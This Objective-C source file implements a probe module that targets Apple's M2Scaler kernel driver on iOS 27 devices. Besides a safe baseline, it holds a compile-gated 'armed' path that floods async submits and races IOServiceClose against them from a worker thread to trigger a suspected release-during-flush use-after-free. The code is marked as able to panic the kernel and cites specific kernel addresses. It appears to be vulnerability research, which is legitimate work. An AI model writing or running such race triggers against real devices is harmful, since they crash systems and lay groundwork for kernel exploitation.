#import "KPM2ScalerProbeModule.h"

#import "KPLog.h"

#import <IOKit/IOKitLib.h>
#import <mach/mach.h>

#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef KP_M2SCALER27_ENABLE_ARMED
#define KP_M2SCALER27_ENABLE_ARMED 0
#endif

#define KP_M2SCALER_SUBMIT_SELECTOR 1
#define KP_M2SCALER_CREDIT_SELECTOR 10
#define KP_M2SCALER_TSD_SIZE 0x1b0
#define KP_M2SCALER_CREDIT_SIZE 0x18
#define KP_M2SCALER_SURFACE_DIMENSION 32
#define KP_M2SCALER_LOCK_RESULT_SIZE 0xc68
#define KP_M2SCALER_RACE_CALL_LIMIT 16

@interface KPM2ScalerProbeModule ()
@property (nonatomic, copy, readwrite) NSString *identifier;
@property (nonatomic, copy, readwrite) NSString *title;
@property (nonatomic, copy, readwrite) NSString *subtitle;
@property (nonatomic, copy, readwrite) NSString *icon;
@property (nonatomic, assign, readwrite) KPTestSection section;
@end

typedef struct {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixelFormat;
    uint32_t bytesPerElement;
    uint32_t bytesPerRow;
    uint32_t allocSize;
} KPM2ScalerFastCreateArgs;

typedef struct {
    uint8_t bytes[KP_M2SCALER_TSD_SIZE];
} KPM2ScalerTSD;

typedef struct {
    io_connect_t connection;
    uint32_t ids[2];
    uint32_t count;
} KPM2ScalerSurfaces;

static const char *KPM2ScalerKR(kern_return_t kr) {
    switch (kr) {
        case KERN_SUCCESS: return "KERN_SUCCESS";
        case kIOReturnNoDevice: return "kIOReturnNoDevice";
        case kIOReturnNotOpen: return "kIOReturnNotOpen";
        case kIOReturnNotReady: return "kIOReturnNotReady";
        case kIOReturnNotPermitted: return "kIOReturnNotPermitted";
        case kIOReturnUnsupported: return "kIOReturnUnsupported";
        case kIOReturnBadArgument: return "kIOReturnBadArgument";
        case kIOReturnError: return "kIOReturnError";
        default: return "kern_return";
    }
}

static void KPM2ScalerAppendKR(NSMutableString *report, const char *operation, kern_return_t kr) {
    [report appendFormat:@"    %-42s kr=0x%08x (%s / %d)\n",
     operation, (uint32_t)kr, KPM2ScalerKR(kr), (int32_t)kr];
}

static void KPM2ScalerRecordKR(NSMutableString *report, const char *operation, kern_return_t kr) {
    KPM2ScalerAppendKR(report, operation, kr);
    [KPLog.shared appendFormat:@"M2Scaler %s: kr=0x%08x (%s / %d)",
     operation, (uint32_t)kr, KPM2ScalerKR(kr), (int32_t)kr];
}

static kern_return_t KPM2ScalerOpen(io_service_t service, io_connect_t *connection) {
    *connection = IO_OBJECT_NULL;
    return IOServiceOpen(service, mach_task_self(), 0, connection);
}

static BOOL KPM2ScalerCheckClass(io_connect_t connection, NSMutableString *report) {
    io_name_t className;
    memset(className, 0, sizeof(className));
    kern_return_t kr = IOObjectGetClass(connection, className);
    [report appendFormat:@"    connection=%u class=%s expected=IOSurfaceAcceleratorClient kr=0x%08x\n",
     connection, kr == KERN_SUCCESS ? className : "<class-error>", (uint32_t)kr];
    [KPLog.shared appendFormat:@"M2Scaler IOObjectGetClass: class=%s kr=0x%08x",
     kr == KERN_SUCCESS ? className : "<class-error>", (uint32_t)kr];
    return kr == KERN_SUCCESS && strcmp(className, "IOSurfaceAcceleratorClient") == 0;
}

static kern_return_t KPM2ScalerCreateSurface(io_connect_t connection,
                                              uint32_t *surfaceID,
                                              size_t *resultSizeOut) {
    KPM2ScalerFastCreateArgs args;
    memset(&args, 0, sizeof(args));
    args.width = KP_M2SCALER_SURFACE_DIMENSION;
    args.height = KP_M2SCALER_SURFACE_DIMENSION;
    args.pixelFormat = 0x42475241;
    args.bytesPerElement = 4;
    args.bytesPerRow = KP_M2SCALER_SURFACE_DIMENSION * 4;
    args.allocSize = KP_M2SCALER_SURFACE_DIMENSION * KP_M2SCALER_SURFACE_DIMENSION * 4;

    uint8_t result[KP_M2SCALER_LOCK_RESULT_SIZE];
    memset(result, 0, sizeof(result));
    size_t resultSize = sizeof(result);
    *surfaceID = 0;
    kern_return_t kr = IOConnectCallMethod(connection, 6,
                                           NULL, 0,
                                           &args, sizeof(args),
                                           NULL, NULL,
                                           result, &resultSize);
    if (resultSizeOut) {
        *resultSizeOut = resultSize;
    }
    if (kr == KERN_SUCCESS && resultSize >= 0x1c) {
        memcpy(surfaceID, result + 0x18, sizeof(*surfaceID));
        if (*surfaceID == 0) {
            return kIOReturnError;
        }
    } else if (kr == KERN_SUCCESS) {
        return kIOReturnUnderrun;
    }
    return kr;
}

static void KPM2ScalerReleaseSurfaces(KPM2ScalerSurfaces *surfaces, NSMutableString *report) {
    if (surfaces->connection == IO_OBJECT_NULL) {
        return;
    }
    for (uint32_t index = 0; index < surfaces->count; index++) {
        uint64_t input = surfaces->ids[index];
        kern_return_t kr = IOConnectCallMethod(surfaces->connection, 1,
                                               &input, 1, NULL, 0,
                                               NULL, NULL, NULL, NULL);
        char operation[64];
        snprintf(operation, sizeof(operation), "IOSurface release id=%u", surfaces->ids[index]);
        KPM2ScalerRecordKR(report, operation, kr);
    }
    kern_return_t kr = IOServiceClose(surfaces->connection);
    KPM2ScalerRecordKR(report, "IOSurfaceRoot close", kr);
    surfaces->connection = IO_OBJECT_NULL;
    surfaces->count = 0;
}

static BOOL KPM2ScalerCreateSurfaces(KPM2ScalerSurfaces *surfaces, NSMutableString *report) {
    memset(surfaces, 0, sizeof(*surfaces));
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL) {
        [report appendString:@"  IOSurfaceRoot not found; no M2 selector was called.\n"];
        return NO;
    }
    kern_return_t kr = KPM2ScalerOpen(service, &surfaces->connection);
    IOObjectRelease(service);
    KPM2ScalerRecordKR(report, "IOSurfaceRoot open type=0", kr);
    if (kr != KERN_SUCCESS) {
        return NO;
    }

    for (uint32_t index = 0; index < 2; index++) {
        size_t resultSize = 0;
        kr = KPM2ScalerCreateSurface(surfaces->connection, &surfaces->ids[index], &resultSize);
        [report appendFormat:@"    IOSurface[%u] 32x32 BGRA id=%u resultSize=%zu\n",
         index, surfaces->ids[index], resultSize];
        KPM2ScalerRecordKR(report, index == 0 ? "IOSurface create src" : "IOSurface create dst", kr);
        if (kr != KERN_SUCCESS) {
            KPM2ScalerReleaseSurfaces(surfaces, report);
            return NO;
        }
        surfaces->count++;
    }
    [report appendFormat:@"  Surfaces: srcID=%u dstID=%u; ID-only fast-create, no pixel-canary success claim.\n",
     surfaces->ids[0], surfaces->ids[1]];
    return YES;
}

static void KPM2ScalerPut32(KPM2ScalerTSD *tsd, size_t offset, uint32_t value) {
    memcpy(tsd->bytes + offset, &value, sizeof(value));
}

static void KPM2ScalerPut64(KPM2ScalerTSD *tsd, size_t offset, uint64_t value) {
    memcpy(tsd->bytes + offset, &value, sizeof(value));
}

static void KPM2ScalerMakeTSD(KPM2ScalerTSD *tsd, uint32_t srcID, uint32_t dstID, uint64_t async) {
    memset(tsd, 0, sizeof(*tsd));
    KPM2ScalerPut32(tsd, 0x00, srcID);
    KPM2ScalerPut32(tsd, 0x04, dstID);
    KPM2ScalerPut64(tsd, 0x08, async);
}

static kern_return_t KPM2ScalerSubmit(io_connect_t connection,
                                      const KPM2ScalerTSD *baseline,
                                      uint64_t async) {
    KPM2ScalerTSD tsd;
    memcpy(&tsd, baseline, sizeof(tsd));
    KPM2ScalerPut64(&tsd, 0x08, async);
    uint64_t scalars[3] = {0, 0, 0};
    return IOConnectCallMethod(connection,
                               KP_M2SCALER_SUBMIT_SELECTOR,
                               scalars, 3,
                               &tsd, sizeof(tsd),
                               NULL, NULL, NULL, NULL);
}

static kern_return_t KPM2ScalerSetCreditZero(io_connect_t connection) {
    uint8_t input[KP_M2SCALER_CREDIT_SIZE] = {0};
    uint64_t scalars[3] = {0, 0, 0};
    return IOConnectCallMethod(connection,
                               KP_M2SCALER_CREDIT_SELECTOR,
                               scalars, 3,
                               input, sizeof(input),
                               NULL, NULL, NULL, NULL);
}

#if KP_M2SCALER27_ENABLE_ARMED

static BOOL KPM2ScalerDrain(NSMutableString *report,
                            io_connect_t connection,
                            const KPM2ScalerTSD *baseline,
                            uint32_t count) {
    usleep(20000);
    [KPLog.shared appendFormat:@"M2Scaler ARMED batch=%u drain sync barrier before selector 1", count];
    kern_return_t kr = KPM2ScalerSubmit(connection, baseline, 0);
    char operation[64];
    snprintf(operation, sizeof(operation), "batch=%u drain sync submit", count);
    KPM2ScalerAppendKR(report, operation, kr);
    usleep(20000);
    [report appendFormat:@"    batch=%u best-effort drain returned %s; queueLength/popcount remain invisible.\n",
     count, KPM2ScalerKR(kr)];
    return kr == KERN_SUCCESS;
}

static BOOL KPM2ScalerRunBatch(NSMutableString *report,
                               io_connect_t connection,
                               const KPM2ScalerTSD *baseline,
                               uint32_t count) {
    uint32_t completed = 0;
    kern_return_t firstError = KERN_SUCCESS;
    for (uint32_t index = 0; index < count; index++) {
        [KPLog.shared appendFormat:@"M2Scaler ARMED batch=%u index=%u before async selector 1", count, index];
        kern_return_t kr = KPM2ScalerSubmit(connection, baseline, 1);
        char operation[64];
        snprintf(operation, sizeof(operation), "batch=%u async[%u]", count, index);
        KPM2ScalerAppendKR(report, operation, kr);
        if (kr != KERN_SUCCESS) {
            if (firstError == KERN_SUCCESS) {
                firstError = kr;
            }
            break;
        }
        completed++;
    }
    BOOL drained = KPM2ScalerDrain(report, connection, baseline, count);
    [report appendFormat:@"  Batch %u: accepted=%u/%u firstError=0x%08x drain=%s.\n",
     count, completed, count, (uint32_t)firstError, drained ? "returned-success" : "failed"];
    return completed == count && firstError == KERN_SUCCESS && drained;
}

typedef struct {
    io_connect_t connection;
    KPM2ScalerTSD baseline;
    atomic_int ready;
    atomic_int start;
    atomic_int stop;
    atomic_int closeIssued;
    atomic_int closeFinished;
    atomic_int workerFinished;
    atomic_uint callsStarted;
    atomic_uint callsCompleted;
    atomic_uint successes;
    kern_return_t results[KP_M2SCALER_RACE_CALL_LIMIT];
} KPM2ScalerRaceContext;

static void *KPM2ScalerRaceWorker(void *argument) {
    KPM2ScalerRaceContext *context = argument;
    atomic_store_explicit(&context->ready, 1, memory_order_release);
    while (!atomic_load_explicit(&context->start, memory_order_acquire)) {
        if (atomic_load_explicit(&context->stop, memory_order_acquire)) {
            atomic_store_explicit(&context->workerFinished, 1, memory_order_release);
            return NULL;
        }
        sched_yield();
    }

    @autoreleasepool {
        for (uint32_t index = 0; index < KP_M2SCALER_RACE_CALL_LIMIT; index++) {
            if (atomic_load_explicit(&context->stop, memory_order_acquire) ||
                atomic_load_explicit(&context->closeIssued, memory_order_acquire)) {
                break;
            }
            atomic_fetch_add_explicit(&context->callsStarted, 1, memory_order_release);
            [KPLog.shared appendFormat:@"M2Scaler ARMED R1 index=%u before outstanding async selector 1", index];
            kern_return_t kr = KPM2ScalerSubmit(context->connection, &context->baseline, 1);
            context->results[index] = kr;
            if (kr == KERN_SUCCESS) {
                atomic_fetch_add_explicit(&context->successes, 1, memory_order_release);
            }
            atomic_fetch_add_explicit(&context->callsCompleted, 1, memory_order_release);
        }
    }
    atomic_store_explicit(&context->workerFinished, 1, memory_order_release);
    return NULL;
}

static BOOL KPM2ScalerWaitForFlag(atomic_int *flag, uint32_t timeoutMs) {
    for (uint32_t elapsed = 0; elapsed < timeoutMs; elapsed++) {
        if (atomic_load_explicit(flag, memory_order_acquire)) {
            return YES;
        }
        usleep(1000);
    }
    return atomic_load_explicit(flag, memory_order_acquire) != 0;
}

static BOOL KPM2ScalerRunRace(NSMutableString *report,
                              io_service_t service,
                              io_connect_t *connection,
                              const KPM2ScalerTSD *baseline,
                              BOOL *preserveSurfaces) {
    [report appendString:@"\n  ARMED R1/R2 lifecycle: at most 16 R1 submits, one close, one R2 submit; no spray/KRW/compositor storm.\n"];
    KPM2ScalerRaceContext *context = calloc(1, sizeof(*context));
    if (!context) {
        [report appendString:@"  R1 context allocation failed; lifecycle probe withheld.\n"];
        return NO;
    }
    context->connection = *connection;
    memcpy(&context->baseline, baseline, sizeof(context->baseline));

    pthread_t thread;
    int threadKR = pthread_create(&thread, NULL, KPM2ScalerRaceWorker, context);
    if (threadKR != 0) {
        [report appendFormat:@"  R1 pthread_create failed=%d; lifecycle probe withheld.\n", threadKR];
        free(context);
        return NO;
    }

    BOOL ready = KPM2ScalerWaitForFlag(&context->ready, 250);
    if (ready) {
        atomic_store_explicit(&context->start, 1, memory_order_release);
    } else {
        [report appendString:@"  R1 worker ready timeout; close will be cleanup-only.\n"];
        atomic_store_explicit(&context->stop, 1, memory_order_release);
        atomic_store_explicit(&context->start, 1, memory_order_release);
    }

    BOOL accepted = NO;
    if (ready) {
        for (uint32_t elapsed = 0; elapsed < 250; elapsed++) {
            if (atomic_load_explicit(&context->successes, memory_order_acquire) != 0) {
                accepted = YES;
                break;
            }
            if (atomic_load_explicit(&context->workerFinished, memory_order_acquire)) {
                break;
            }
            usleep(1000);
        }
        accepted = accepted || atomic_load_explicit(&context->successes, memory_order_acquire) != 0;
    }

    atomic_store_explicit(&context->closeIssued, 1, memory_order_release);
    uint32_t startedAtClose = atomic_load_explicit(&context->callsStarted, memory_order_acquire);
    uint32_t completedAtClose = atomic_load_explicit(&context->callsCompleted, memory_order_acquire);
    [KPLog.shared appendFormat:@"M2Scaler ARMED R1 before IOServiceClose accepted=%u started=%u completed=%u",
     accepted, startedAtClose, completedAtClose];
    kern_return_t closeKR = IOServiceClose(*connection);
    *connection = IO_OBJECT_NULL;
    atomic_store_explicit(&context->closeFinished, 1, memory_order_release);
    atomic_store_explicit(&context->stop, 1, memory_order_release);
    KPM2ScalerRecordKR(report, "ARMED R1 IOServiceClose", closeKR);

    BOOL finished = KPM2ScalerWaitForFlag(&context->workerFinished, 500);
    BOOL joined = NO;
    int joinKR = 0;
    if (finished) {
        joinKR = pthread_join(thread, NULL);
        joined = joinKR == 0;
    }
    if (!joined) {
        pthread_detach(thread);
        *preserveSurfaces = YES;
    }

    uint32_t completed = atomic_load_explicit(&context->callsCompleted, memory_order_acquire);
    uint32_t started = atomic_load_explicit(&context->callsStarted, memory_order_acquire);
    uint32_t successes = atomic_load_explicit(&context->successes, memory_order_acquire);
    if (completed > KP_M2SCALER_RACE_CALL_LIMIT) {
        completed = KP_M2SCALER_RACE_CALL_LIMIT;
    }
    for (uint32_t index = 0; index < completed; index++) {
        char operation[64];
        snprintf(operation, sizeof(operation), "ARMED R1 async[%u]", index);
        KPM2ScalerAppendKR(report, operation, context->results[index]);
    }
    [report appendFormat:@"  R1: accepted=%u closeOverlapCandidate=%u startedAtClose=%u completedAtClose=%u started=%u completed=%u success=%u close=0x%08x finished=%u joined=%u joinKR=%d.\n",
     accepted, startedAtClose > completedAtClose, startedAtClose, completedAtClose,
     started, completed, successes, (uint32_t)closeKR, finished, joined, joinKR];
    [report appendString:@"  closeOverlapCandidate describes userspace scheduling only; it does not prove an outstanding kernel request or UAF.\n"];

    if (!joined) {
        [report appendString:@"  R1 worker exceeded bounded 500 ms wait; detached, surfaces retained, no second close and no R2.\n"];
    }

    BOOL overlapCandidate = startedAtClose > completedAtClose;
    BOOL allowR2 = accepted && overlapCandidate && closeKR == KERN_SUCCESS && joined;
    if (allowR2) {
        io_connect_t r2 = IO_OBJECT_NULL;
        kern_return_t openKR = KPM2ScalerOpen(service, &r2);
        KPM2ScalerRecordKR(report, "ARMED R2 open type=0", openKR);
        if (openKR == KERN_SUCCESS && KPM2ScalerCheckClass(r2, report)) {
            [KPLog.shared append:@"M2Scaler ARMED R2 before single async selector 1"];
            kern_return_t submitKR = KPM2ScalerSubmit(r2, baseline, 1);
            KPM2ScalerRecordKR(report, "ARMED R2 single async submit", submitKR);
            usleep(50000);
        } else {
            [report appendString:@"  R2 submit withheld: open/class validation failed.\n"];
        }
        if (r2 != IO_OBJECT_NULL) {
            kern_return_t r2CloseKR = IOServiceClose(r2);
            KPM2ScalerRecordKR(report, "ARMED R2 IOServiceClose", r2CloseKR);
        }
    } else {
        [report appendString:@"  R2 withheld: R1 acceptance, overlap candidate, close and bounded worker join must all succeed.\n"];
    }

    if (joined) {
        free(context);
    }
    return allowR2;
}

static void KPM2ScalerRunArmed(NSMutableString *report,
                               io_service_t service,
                               io_connect_t *connection,
                               const KPM2ScalerTSD *baseline,
                               BOOL *preserveSurfaces) {
    [report appendString:@"\n=== M2Scaler 27 bounded armed path ===\n"];
    [report appendString:@"Batches: 2, 8, 16, then 24, 32, 40 only after successful best-effort drains. Each drain is 20 ms settle + sync submit + 20 ms settle.\n"];
    [report appendString:@"No userspace completion API or KRW proves actual drain, queueLength >= 5, or returned-page popcount == 8. Batch sizes are scheduling inputs, not threshold guarantees.\n"];
    const uint32_t initialBatches[] = {2, 8, 16};
    const uint32_t escalationBatches[] = {24, 32, 40};
    for (uint32_t index = 0; index < sizeof(initialBatches) / sizeof(initialBatches[0]); index++) {
        if (!KPM2ScalerRunBatch(report, *connection, baseline, initialBatches[index])) {
            [report appendString:@"  ARMED STOP: initial async batch/drain failed; escalation and R1/R2 withheld.\n"];
            return;
        }
    }
    for (uint32_t index = 0; index < sizeof(escalationBatches) / sizeof(escalationBatches[0]); index++) {
        if (!KPM2ScalerRunBatch(report, *connection, baseline, escalationBatches[index])) {
            [report appendString:@"  ARMED STOP: escalation batch/drain failed; R1/R2 withheld.\n"];
            return;
        }
    }
    [report appendString:@"  Async gate: every submit and every sync drain barrier returned KERN_SUCCESS; proceeding to one bounded lifecycle attempt.\n"];
    KPM2ScalerRunRace(report, service, connection, baseline, preserveSurfaces);
    [report appendString:@"  Oracle guidance: 'deferring arena release during flush' is useful on 27.2; 'sequence list spans two requests' is diagnostic, not rejection and not UAF proof.\n"];
    [report appendString:@"  Verdict boundary: a returned schedule or a panic alone does not prove a stale dereference. Lifetime analysis of the released page is still required.\n"];
}

#endif

static void KPM2ScalerRunSession(NSMutableString *report, BOOL armed) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("AppleM2ScalerCSCDriver"));
    if (service == IO_OBJECT_NULL) {
        [report appendString:@"  AppleM2ScalerCSCDriver not found: environmental reachability result, not a bug-absence verdict.\n"];
        return;
    }

    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr = KPM2ScalerOpen(service, &connection);
    [report appendFormat:@"    service=%u connection=%u type=0\n", service, connection];
    KPM2ScalerRecordKR(report, "AppleM2ScalerCSCDriver open", kr);
    if (kr != KERN_SUCCESS) {
        [report appendString:@"  OPEN FAILED: sandbox/provider state is environmental; selectors and armed path were not reached.\n"];
        IOObjectRelease(service);
        return;
    }
    if (!KPM2ScalerCheckClass(connection, report)) {
        [report appendString:@"  Class query unsupported on this connection (kIOReturnBadArgument); continuing because open succeeded.\n"];
    }

    KPM2ScalerSurfaces surfaces;
    if (!KPM2ScalerCreateSurfaces(&surfaces, report)) {
        [report appendString:@"  Surface setup failed; sync baseline and armed path withheld.\n"];
        kern_return_t closeKR = IOServiceClose(connection);
        KPM2ScalerRecordKR(report, "M2Scaler close after surface failure", closeKR);
        IOObjectRelease(service);
        return;
    }

    KPM2ScalerTSD baseline;
    KPM2ScalerMakeTSD(&baseline, surfaces.ids[0], surfaces.ids[1], 0);
    [report appendString:@"  TSD: size=0x1b0, src +0x00, dst +0x04, async +0x08; all other bytes zero. Full format beyond these fields is unverified.\n"];
    [KPLog.shared append:@"M2Scaler safe baseline before selector 1 sync"];
    kern_return_t syncKR = KPM2ScalerSubmit(connection, &baseline, 0);
    KPM2ScalerRecordKR(report, "selector 1 sync scalarIn=3", syncKR);

    uint8_t creditLayout[KP_M2SCALER_CREDIT_SIZE] = {0};
    uint64_t trailing0 = 0;
    uint64_t trailing1 = 0;
    memcpy(&trailing0, creditLayout + 8, sizeof(trailing0));
    memcpy(&trailing1, creditLayout + 16, sizeof(trailing1));
    [report appendFormat:@"  Selector 10 input: u32[0]=0 (<4), trailing +8=0x%016llx +16=0x%016llx; trailing bytes are not claimed as scheduler markers.\n",
     trailing0, trailing1];
    [KPLog.shared append:@"M2Scaler safe baseline before selector 10 credit=0"];
    kern_return_t creditKR = KPM2ScalerSetCreditZero(connection);
    KPM2ScalerRecordKR(report, "selector 10 credit=0 scalarIn=3", creditKR);

    BOOL baselineOK = syncKR == KERN_SUCCESS && creditKR == KERN_SUCCESS;
    [report appendFormat:@"  Baseline gate: %s; only real KERN_SUCCESS from both selectors enables armed work.\n",
     baselineOK ? "PASS" : "BLOCKED"];
    if (!baselineOK) {
        [report appendString:@"  Full TSD/ABI acceptance is unproven; do not compensate with larger batches or markers.\n"];
    }

    BOOL preserveSurfaces = NO;
#if KP_M2SCALER27_ENABLE_ARMED
    if (armed && baselineOK) {
        KPM2ScalerRunArmed(report, service, &connection, &baseline, &preserveSurfaces);
    } else if (armed) {
        [report appendString:@"  ARMED BLOCKED: sync/credit baseline did not complete successfully.\n"];
    }
#else
    (void)armed;
#endif

    if (connection != IO_OBJECT_NULL) {
        [KPLog.shared appendFormat:@"M2Scaler before final normal close armed=%u", armed];
        kern_return_t closeKR = IOServiceClose(connection);
        KPM2ScalerRecordKR(report, "M2Scaler final normal close", closeKR);
        connection = IO_OBJECT_NULL;
    }
    if (preserveSurfaces) {
        [report appendString:@"  Surface cleanup deferred: an R1 worker did not join; the two surfaces and IOSurfaceRoot connection remain retained until process exit.\n"];
    } else {
        KPM2ScalerReleaseSurfaces(&surfaces, report);
    }
    IOObjectRelease(service);
}

@implementation KPM2ScalerProbeModule

- (instancetype)init {
    return [self initWithArmed:NO];
}

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        if (armed) {
            _identifier = @"m2scaler27.race";
            _title = @"M2Scaler 27 PIODMA Armed";
            _subtitle = @"ARMED bounded async/close lifecycle — may panic the kernel";
            _icon = @"exclamationmark.triangle";
        } else {
            _identifier = @"m2scaler.piodma";
            _title = @"M2Scaler 27 PIODMA Probe";
            _subtitle = @"Safe open, 32×32 BGRA surfaces, sync submit and credit=0";
            _icon = @"cable.connector";
        }
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV3 M2Scaler 27 PIODMA probe ===\n"];
    [report appendString:@"Target: AppleM2ScalerCSCDriver / IOSurfaceAcceleratorClient, iPhone16,1 A17 Pro, iOS 27.0.1 and 27.2 static ABI.\n"];
    [report appendString:@"Candidate: release-during-flush; no stale dereference, controlled reclaim, UAF or corruption primitive is asserted.\n"];
    [report appendString:@"27.0.1: flush #953 0xfffffff008f52fb8 -> reclaim #954 0xfffffff008f530c0 -> arenaReturnPage #958 0xfffffff008f5354c.\n"];
    [report appendString:@"27.2: flush #955 0xfffffff008f950e4 sets +0x534; arenaReturnPage #961 0xfffffff008f9584c can defer release.\n"];
    [report appendString:@"Thresholds: popcount == 8 and queueLength >= 5; selector 10 accepts only u32[0] < 4. Legacy DEAD/BEEF markers are intentionally unused.\n"];
#if KP_M2SCALER27_ENABLE_ARMED
    [report appendFormat:@"Armed build: yes; this row is %s.\n", self.isArmed ? "ARMED explicit-tap only" : "safe baseline only"];
#else
    [report appendString:@"Armed build: no.\n"];
    if (self.isArmed) {
        [report appendString:@"Armed: NOT COMPILED (requires KP_M2SCALER27_ENABLE_ARMED=1 in the unified build).\n"];
        return report;
    }
#endif
    KPM2ScalerRunSession(report, self.isArmed);
    return report;
}

@end
